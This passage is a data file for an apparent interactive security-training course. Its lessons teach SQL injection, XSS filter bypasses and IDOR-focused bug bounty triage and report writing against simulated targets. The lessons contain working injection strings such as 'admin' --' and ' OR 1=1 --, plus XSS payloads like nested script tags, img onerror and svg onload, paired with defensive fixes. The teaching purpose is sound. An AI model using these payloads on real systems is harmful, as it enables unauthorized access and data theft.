          htmlSource: `<div class="p-6 bg-slate-900 border border-slate-800 rounded-lg text-slate-100">
  <h2 class="text-xl font-bold mb-4">BookVault Catalog</h2>
  <div class="mb-4">
    <input type="text" id="search-box" placeholder="Search titles..." class="w-full bg-slate-950 border border-slate-700 px-3 py-2 rounded text-slate-200" />
  </div>
  <div id="results" class="text-sm text-slate-400">
    Showing results for: <span id="query-echo" class="text-slate-100">Cybersecurity</span>
  </div>
</div>`,
          storageItems: [
            { key: 'auth_jwt', value: 'secret_session_token_123', type: 'cookie' }
          ],
          networkRequests: []
        }
      },
      {
        id: 'lesson-3-2',
        trackId: 'track-3',
        number: '3.2',
        title: 'Breaking the Syntax (SQL Query Anatomy)',
        tagline: 'You don\'t need to memorize SQL payloads. You just need to understand where the quotation mark closes.',
        estimatedMinutes: 12,
        difficulty: 'Intermediate',
        mentalModelConcept: 'SQL Injection happens when untrusted user input contains characters that close a string literal and inject new relational boolean logic into the database query.',
        discoveryPrompt: 'Look at the query builder below. It constructs: `SELECT * FROM users WHERE email = \'USER_INPUT\'`. Type a single quotation mark (`\'`) into the email box. Look at what happens to the SQL syntax tree!',
        discoveryComponent: 'SqlAstVisualizerDemo',
        noticeThisMoments: [
          'Notice how a single quote (\') tells the database engine: "this is the end of the text string, whatever comes next is SQL code!"',
          'Notice how adding `OR 1=1` forces a FALSE statement to become TRUE for every single row in the database table.',
          'Notice how double hyphens (`--`) comment out the rest of the developer\'s original query (like the password check!).'
        ],
        explanationMarkdown: `
### The Mental Model: The Legal Document Blanks

Imagine a contract that says:
*"I agree that the user named [ ____________ ] may borrow the office laptop."*

Normally, you write your name:
*"I agree that the user named [ Alex Chen ] may borrow the office laptop."*

Now imagine you write:
*"I agree that the user named [ Alex Chen, and furthermore the company transfers 100% ownership of all corporate bank accounts to Alex Chen; disregard the rest of this page: ] may borrow the office laptop."*

If the company lawyer just signs the bottom without looking, you just rewrote the contract!

#### The Code Behind the Vulnerability
\`\`\`sql
-- Vulnerable string concatenation:
query = "SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + passInput + "'";
\`\`\`
If \`userInput\` is:
\`\`\`sql
admin' --
\`\`\`
The full string executed by the database becomes:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
\`\`\`
The \`--\` tells SQL to completely ignore everything after it. The password check never runs! The database logs you in as \`admin\` immediately.

> **The Habit to Build:** Don't think of SQLi as magical spells like \`' OR 1=1 --\`. Think of it as **syntax punctuation**. You are closing a quote, adding a boolean condition, and commenting out the trailing syntax.
        `,
        devTakeaway: 'Always use parameterized queries (Prepared Statements) or an ORM with bound parameters. Never concatenate strings into SQL.',
        securityTakeaway: 'Look for inputs that query databases (search, login, filter, sort). Test with single quotes and observe syntax error responses.',
        challenge: {
          id: 'chal-3-2',
          type: 'injection',
          prompt: 'Construct an input in the query simulator that closes the string literal and adds a boolean condition that evaluates to TRUE without verifying the password.',
          targetHint: 'Try typing: admin\' OR 1=1 -- into the login input.',
          solution: (input: string) => /'(\s*)or(\s*)1=1/i.test(input) || /'(\s*)or(\s*)'1'='1/i.test(input),
          successMessage: 'Query hijacked! You changed the logic of the database query. The database evaluated 1=1 as TRUE for the entire table.',
          explanation: 'Parameterized queries completely eliminate this vulnerability because the database engine treats all input strictly as literal data, never as executable SQL commands.'
        },
        simulatedTarget: {
          appName: 'VaultPortal Enterprise Login',
          targetUrl: 'https://vault.corp/login',
          description: 'Login authentication against SQL user database.',
          htmlSource: `<div class="p-6 bg-slate-900 border border-slate-800 rounded-lg text-slate-100 max-w-md mx-auto">
  <h2 class="font-bold text-lg mb-4">Enterprise Database Login</h2>
  <div class="space-y-4">
    <div>
      <label class="block text-xs uppercase text-slate-400 mb-1">Username / Email</label>
      <input type="text" id="sql-user" class="w-full bg-slate-950 border border-slate-700 px-3 py-2 rounded text-slate-100 font-mono" />
    </div>
    <div>
      <label class="block text-xs uppercase text-slate-400 mb-1">Password</label>
      <input type="password" id="sql-pass" class="w-full bg-slate-950 border border-slate-700 px-3 py-2 rounded text-slate-100" />
    </div>
  </div>
</div>`,
          storageItems: [],
          networkRequests: []
        }
      },
      {
        id: 'lesson-3-3',
        trackId: 'track-3',
        number: '3.3',
        title: 'Sanitization vs Escaping',
        tagline: 'Why blacklists fail, why <scr<script>ipt> bypasses naive regex, and why encoding wins.',
        estimatedMinutes: 10,
        difficulty: 'Intermediate',
        mentalModelConcept: 'Blacklisting (trying to strip bad words) always fails because attacker formats are infinite. Contextual encoding (transforming special characters into harmless entities) always succeeds.',
        discoveryPrompt: 'A naive developer wrote a filter that strips the exact word `<script>` from your input. Try typing `<scr<script>ipt>`. What remains after the filter runs once?',
        discoveryComponent: 'SanitizationBypassDemo',
        noticeThisMoments: [
          'Notice that when a single-pass filter deletes `<script>`, the remaining halves `<scr` and `ipt>` snap together to form a brand new `<script>` tag!',
          'Notice alternative HTML vectors like `<img src=x onerror=...>`, `<svg onload=...>`, `<iframe src=...>`, or `javascript:...` links that don\'t use `<script>` at all.',
          'Notice that encoding converts `<` into `&lt;` — the browser displays the character safely on screen without executing it as a tag.'
        ],
        explanationMarkdown: `
### The Mental Model: The Bouncer with a List of Forbidden Words

Imagine a nightclub bouncer who is told: *"Do not let anyone in who is wearing a red hat."*
So an attendee wears a blue hat with a red feather. The bouncer lets them in.
The next night, the bouncer is told: *"No red hats and no red feathers."*
So the attendee wears a red bandana. The bouncer lets them in.

**This is the fundamental failure of blacklisting.**
You cannot create a list of all bad inputs in the universe. In web security, there are over 100+ ways to trigger JavaScript execution in HTML without ever writing the letters \`<script>\`.

#### The Naive Regex Filter
\`\`\`javascript
// Bad: Single-pass blacklist replacement
const sanitized = input.replace(/<script>/gi, '');
\`\`\`
If you send: \`<scr<script>ipt>\`
1. The regex finds \`<script>\` in the middle and deletes it.
2. The outer \`<scr\` and \`ipt>\` join together.
3. The result is \`<script>\`!

#### The Robust Solution: Context-Aware Escaping
Instead of trying to guess which tags are "safe" or "evil", transform syntax characters so the browser treats them strictly as text:
* \`<\` becomes \`&lt;\`
* \`>\` becomes \`&gt;\`
* \`"\` becomes \`&quot;\`
* \`'\` becomes \`&#x27;\`

Now, even if a user submits \`<script>alert(1)</script>\`, the browser renders the letters on screen harmlessly instead of running them.

> **The Habit to Build:** When auditing an application, test if input filtering is a simple regex string replacement. Try nesting forbidden strings or using alternative event handlers (\`onload\`, \`onerror\`, \`autofocus\`).
        `,
        devTakeaway: 'Never write custom regex sanitization functions for HTML or SQL. Use well-audited libraries (DOMPurify for rich HTML) or framework auto-escaping.',
        securityTakeaway: 'Recognize filtering behavior. If <script> is blocked, test case mutation (<ScRiPt>), nesting (<scr<script>ipt>), or event handlers (<svg onload=>).',
        challenge: {
          id: 'chal-3-3',
          type: 'injection',
          prompt: 'Bypass the single-pass "<script>" filter by typing a payload that reconstructs the forbidden tag or uses an alternate vector like an img onerror handler.',
          targetHint: 'Try nested tags: <scr<script>ipt>alert(1)</script> or an <img onerror> tag.',
          solution: (input: string) => /<scr<script>ipt>/i.test(input) || /<img.*onerror/i.test(input) || /<svg.*onload/i.test(input),
          successMessage: 'Filter bypassed! You demonstrated why naive blacklist sanitization is futile against nested input and alternative event vectors.',
          explanation: 'Modern security relies on strict context-aware encoding or rigorous sanitizers like DOMPurify that parse the full DOM tree rather than doing string regex replacement.'
        },
        simulatedTarget: {
          appName: 'Community Forum Comment Box',
          targetUrl: 'https://forum.dev/threads/992#reply',
          description: 'User discussion thread with naive comment filter.',
          htmlSource: `<div class="p-4 bg-slate-900 border border-slate-800 rounded-lg text-slate-100">
  <h3 class="font-bold mb-2">Leave a Comment</h3>
  <textarea id="comment-input" class="w-full bg-slate-950 border border-slate-700 p-2 rounded text-sm text-slate-200" placeholder="Write something..."></textarea>
</div>`,
          storageItems: [],
          networkRequests: []
        }
      }
    ]
  },
  {
    id: 'track-4',
    number: 4,
    title: 'The Bug Bounty Mindset',
    shortDescription: 'From solving puzzles to auditing living systems: discovery instincts, threat modeling, and professional triage reporting.',
    philosophyBadge: 'Systems Thinking & Real Impact',
    iconName: 'ShieldAlert',
    colorAccent: 'purple',
    lessons: [
      {
        id: 'lesson-4-1',
        trackId: 'track-4',
        number: '4.1',
        title: 'The Habit of Noticing (Pulling the Thread)',
        tagline: 'CTFs have flags. Bug bounties have unexamined assumptions. Here is how to look at any system and find the loose thread.',
        estimatedMinutes: 12,
        difficulty: 'Intermediate',
        mentalModelConcept: 'A vulnerability is not a puzzle piece left for you to find; it is a mismatch between what the developer intended and how the system actually behaves under unanticipated conditions.',
        discoveryPrompt: 'Explore the full mock e-commerce store "ShopNova" below. There are no flags, no popups, and no instructions. Can you spot 4 subtle clues that warrant deeper investigation?',
        discoveryComponent: 'TargetReconSandbox',
        noticeThisMoments: [
          'Notice how URL parameters change as you navigate tabs: `?tab=profile`, `?user_id=104`, `?redirect=/home`.',
          'Notice API calls in the Network tab: are there responses with status 200 containing data you didn\'t ask for?',
          'Notice error messages: when you enter invalid data, does the app return a helpful generic error, or does it dump a full stack trace with database version numbers?'
        ],
        explanationMarkdown: `
### The Mental Model: The Difference Between CTF and Bug Bounty

Let's revisit the core principle that defines this track:
* **The CTF Mindset:** "The author of this challenge hid a flag in this room. There is a specific riddle or exploit path designed to lead me there. If I hit a dead end, I missed a hint."
* **The Bug Bounty Mindset:** "A team of tired human developers built this feature at 3:00 PM on a Friday before a major product release. They made reasonable assumptions about how people would use it. Where does their assumption break?"

#### The 5 Questions Every Security Thinker Asks:
1. **What is the client telling the server that the server should already know?** (e.g. price, role, user ID)
2. **What happens if I repeat this action 1,000 times in 1 second?** (Rate limiting, race conditions)
3. **What happens if I change the ID in the URL to someone else's ID?** (IDOR, BOLA)
4. **What data is traveling over the network that is not rendered on the screen?** (Excessive data exposure)
5. **What happens if I feed unexpected types?** (Negative numbers, arrays instead of strings, null values)

> **The Habit to Build:** When exploring a new target, don't rush to run automated scanners. Spend 20 minutes clicking around like a normal user, watching your DevTools Network tab. Notice the flow of data.
        `,
        devTakeaway: 'Build with the assumption that your API will be called with weird, malformed, out-of-order, and adversarial inputs.',
        securityTakeaway: 'Form hypotheses before testing. "If I change this param, I hypothesize the server will leak customer billing data." Then verify.',
        challenge: {
          id: 'chal-4-1',
          type: 'triage',
          prompt: 'Audit the ShopNova target application in the sandbox below. Identify at least 3 suspicious anomalies and select the highest-risk finding.',
          targetHint: 'Check the coupon code endpoint in the network tab, the order history URL ID parameter, and the hidden checkout role input.',
          solution: 'idor_order_history',
          successMessage: 'Outstanding observation! You identified that order history relies on unauthenticated sequential IDs (/api/orders/8821), exposing other customers’ private home addresses and purchases.',
          explanation: 'In bug bounty, spotting the anomaly is 80% of the battle. You don’t need high-level exploits to deliver enormous value; you need keen observation.'
        },
        simulatedTarget: {
          appName: 'ShopNova Marketplace',
          targetUrl: 'https://shopnova.io/store',
          description: 'Simulated modern e-commerce platform with multiple architectural anomalies.',
          htmlSource: `<div class="p-6 bg-slate-900 border border-slate-800 rounded-lg text-slate-100">
  <header class="flex justify-between items-center border-b border-slate-800 pb-4 mb-4">
    <div class="font-bold text-lg text-purple-400">ShopNova</div>
    <div class="text-xs text-slate-400">Logged in as: buyer_alex (#8821)</div>
  </header>
  <div class="grid grid-cols-2 gap-4">
    <div class="p-4 bg-slate-950 border border-slate-800 rounded">
      <h4 class="font-semibold text-sm">Recent Order #8821</h4>
      <p class="text-xs text-slate-400 mt-1">Status: Shipped to 742 Evergreen Terr</p>
      <a href="/api/orders/8821" class="text-xs text-cyan-400 underline mt-2 block">View Raw Receipt</a>
    </div>
    <div class="p-4 bg-slate-950 border border-slate-800 rounded">
      <h4 class="font-semibold text-sm">Coupon Code</h4>
      <input type="text" placeholder="Promo code..." value="WELCOME10" class="w-full text-xs bg-slate-900 border border-slate-700 p-1.5 rounded mt-1" />
    </div>
  </div>
</div>`,
          storageItems: [
            { key: 'shopnova_cart_token', value: 'tok_cart_guest_99', type: 'cookie' },
            { key: 'user_permission_level', value: 'standard_customer', type: 'localStorage' }
          ],
          networkRequests: [
            {
              url: '/api/orders/8821',
              method: 'GET',
              status: 200,
              headers: { 'Content-Type': 'application/json' },
              response: { order_id: 8821, customer_name: 'Alex Chen', address: '742 Evergreen Terr', total: 64.50 }
            },
            {
              url: '/api/coupons/verify?code=WELCOME10',
              method: 'GET',
              status: 200,
              headers: { 'Content-Type': 'application/json' },
              response: { valid: true, discount_percent: 10, max_uses_remaining: 9999 }
            }
          ]
        }
      },
      {
        id: 'lesson-4-2',
        trackId: 'track-4',
        number: '4.2',
        title: 'Severity & The Real-World Risk',
        tagline: 'Why "I changed my own profile picture" is not a vulnerability, and how to measure real business impact.',
        estimatedMinutes: 10,
        difficulty: 'Intermediate',
        mentalModelConcept: 'Severity is determined by the intersection of exploitability (how hard is it?) and impact (what does the organization lose?).',
        discoveryPrompt: 'Use the interactive CVSS / Severity Matrix calculator below. Compare two findings: an open redirect on a logout URL vs an unauthenticated IDOR leaking customer credit cards. How does severity shift from Low (P4) to Critical (P1)?',
        discoveryComponent: 'CvssCalculatorDemo',
        noticeThisMoments: [
          'Notice how security impact maps to the CIA Triad: Confidentiality (data leaked), Integrity (data modified), and Availability (service destroyed).',
          'Notice why self-XSS (an XSS that only you can execute on yourself) is routinely rejected by bug bounty triage teams.',
          'Notice how conveying the real-world business risk (e.g. "financial liability under GDPR", "brand reputational damage") makes engineering teams prioritize fixes.'
        ],
        explanationMarkdown: `
### The Mental Model: The Smoke Alarm vs The Fire Hose

If a smoke alarm chirps because its battery is low at 2:00 PM on a Tuesday, that is a nuisance (Low Severity).
If a pipe bursts on the server room ceiling and water is pouring into the main rack, that is an existential emergency (Critical Severity).

In cybersecurity, beginner researchers often confuse **technical neatness** with **business severity**:
* *"I found that when I enter 10,000 characters in the bio field, the page takes 2 extra seconds to render!"* -> **Severity: Informational / P5.** (No data leaked, no accounts compromised).
* *"I found that if I alter the URL parameter \`user_id\` from 10 to 11 on the invoice endpoint, I can download any hospital patient's medical records without logging in."* -> **Severity: Critical / P1.** (Direct breach of protected health information, millions in fines).

#### The Standard Severity Tiers (Bugcrowd / HackerOne / CVSS)
* **P1 - Critical (CVSS 9.0 - 10.0):** Remote Code Execution, Unauthenticated Access to all customer data, Authentication Bypass.
* **P2 - High (CVSS 7.0 - 8.9):** Stored XSS impacting other users, IDOR allowing modification of other users' data, Privilege Escalation.
* **P3 - Medium (CVSS 4.0 - 6.9):** CSRF on sensitive actions, Reflected XSS requiring social engineering, Information Disclosure of internal IPs.
* **P4 - Low (CVSS 0.1 - 3.9):** Open Redirect, Missing security headers without demonstrated exploit, verbose error messages.
* **P5 - Informational:** Best practice suggestions, design flaws with no exploit path.

> **The Habit to Build:** Always ask: *"If this bug is exploited by a malicious actor tomorrow, what does the company actually lose? Money? Customer trust? Compliance certifications?"*
        `,
        devTakeaway: 'Triage bugs based on potential blast radius and real user exposure, not just theoretical purity.',
        securityTakeaway: 'A bug report that clearly explains the business impact is 10x more likely to be accepted, rewarded, and rapidly patched.',
        challenge: {
          id: 'chal-4-2',
          type: 'triage',
          prompt: 'Review the scenario: An attacker can query /api/v1/users/export without any authentication cookie and download the full email and phone database of 500,000 customers. What is the appropriate severity level?',
          targetHint: 'High volume confidential customer PII exposure without authentication.',
          solution: 'Critical',
          successMessage: 'Spot on! This is a textbook Critical (P1) finding. It involves unauthenticated, mass exposure of sensitive personally identifiable information (PII).',
          explanation: 'Critical findings combine zero prerequisites (no special user account needed) with maximum confidentiality impact.'
        },
        simulatedTarget: {
          appName: 'Risk Evaluation Simulator',
          targetUrl: 'https://security.nexus.corp/triage/matrix',
          description: 'Interactive severity scoring rubric.',
          htmlSource: `<div class="p-4 bg-slate-900 border border-slate-800 rounded text-slate-100">
  <h3 class="font-bold">Security Assessment Matrix</h3>
  <p class="text-xs text-slate-400 mt-1">Select severity level based on CIA impact.</p>
</div>`,
          storageItems: [],
          networkRequests: []
        }
      },
      {
        id: 'lesson-4-3',
        trackId: 'track-4',
        number: '4.3',
        title: 'The Professional Triage Report',
        tagline: 'Finding the bug is only half the job. Writing a report that gets taken seriously is what turns an enthusiast into a security professional.',
        estimatedMinutes: 12,
        difficulty: 'Advanced',
        mentalModelConcept: 'A great bug report is reproducible, concise, respectful, and provides actionable remediation advice for engineers.',
        discoveryPrompt: 'Draft your first simulated Bug Bounty submission using the interactive Report Studio below. Fill out the Title, Steps to Reproduce, Impact, and Fix, and get instant triage evaluation feedback!',
        discoveryComponent: 'ReportStudioDemo',
        noticeThisMoments: [
          'Notice how a clear title ("IDOR in /api/invoices allows unauthenticated viewing of other tenants’ billing receipts") beats a vague title ("Big security bug in website").',
          'Notice why clear, step-by-step reproduction instructions allow the security engineer to verify the flaw in under 3 minutes.',
          'Notice that providing a concrete remediation recommendation (e.g. "Add tenant validation in InvoiceRepository.findById") builds deep respect between security and engineering teams.'
        ],
        explanationMarkdown: `
### The Mental Model: The Engineering Bridge

Security engineers and developers are not enemies; they are collaborators on the same team trying to keep people safe.

When an engineer receives a report that says:
> *"YOUR SITE IS HACKED!! PAY ME $$$ OR I LEAK EVERYTHING!!"*

...they will roll their eyes and flag it as spam.

When an engineer receives a report that says:
> **Title:** Insecure Direct Object Reference on /api/v1/invoices/:id leaks customer invoices
> **Severity:** High (CVSS 7.5)
> **Asset:** https://billing.example.com
> **Summary:** The invoice view endpoint fails to verify if the requesting authenticated user owns the requested invoice ID.
> **Steps to Reproduce:**
> 1. Log in as Account A (user_id: 101). Observe invoice #204 at \`/invoices/204\`.
> 2. Log in as Account B in an incognito window.
> 3. Send a GET request to \`/api/v1/invoices/204\` using Account B's session token.
> 4. Notice the server returns 200 OK with Account A's invoice data.
> **Impact:** Any registered user can enumerate and scrape all company invoices, customer names, and pricing agreements.
> **Suggested Fix:** Scope query by user ID: \`WHERE id = ? AND organization_id = ?\`.

That report gets triaged in 15 minutes, awarded a bounty, and patched that afternoon.

> **The Habit to Build:** Always write your reports so that a junior engineer who started working at the company yesterday could follow your steps to reproduce without getting stuck.
        `,
        devTakeaway: 'Treat bug bounty reports as free, high-value QA and security audits. Welcome responsible disclosures with gratitude.',
        securityTakeaway: 'Structure your reports cleanly: Summary, Steps to Reproduce (numbered), Proof of Concept, Business Impact, and Remediation.',
        challenge: {
          id: 'chal-4-3',
          type: 'triage',
          prompt: 'Use the Report Studio below to compose and submit a complete bug report for the IDOR vulnerability found in ShopNova. Ensure you specify steps to reproduce and impact.',
          targetHint: 'Fill out the report fields in the interactive studio below and click Submit for Triage Review.',
          solution: (input: any) => {
            // The Phase-3 text form submits a raw string: reward a written
            // report that names reproduction steps AND business impact.
            const text = String(input ?? '').toLowerCase();
            const hasSteps = /steps?|reproduc/.test(text) &&
              /(1\.|1\)|first|log in|navigate|request|send|open)/.test(text);
            const hasImpact = /impact|expose|leak|unauthor|other tenant|cross-tenant|any (registered )?user|escalat|tamper/.test(text);
            return hasSteps && hasImpact;
          },
          successMessage: 'Triage Approved! Your report scored 95/100 on clarity, reproducibility, and actionable impact. You have completed the foundation of security literacy!',
          explanation: 'Clear communication is the superpower of elite security researchers and engineering leaders alike.'
        },
        simulatedTarget: {
          appName: 'HackerOne / Bugcrowd Triage Simulator',
          targetUrl: 'https://bounty.platform/programs/nexus/report/new',
          description: 'Simulated vulnerability disclosure submission portal.',
          htmlSource: `<div class="p-4 bg-slate-900 border border-slate-800 rounded text-slate-100">
  <h3 class="font-bold">Vulnerability Disclosure Form</h3>
  <p class="text-xs text-slate-400 mt-1">Submit high-quality reproduction steps for triage.</p>
</div>`,
          storageItems: [],
          networkRequests: []
        }
      }
    ]
  }
];
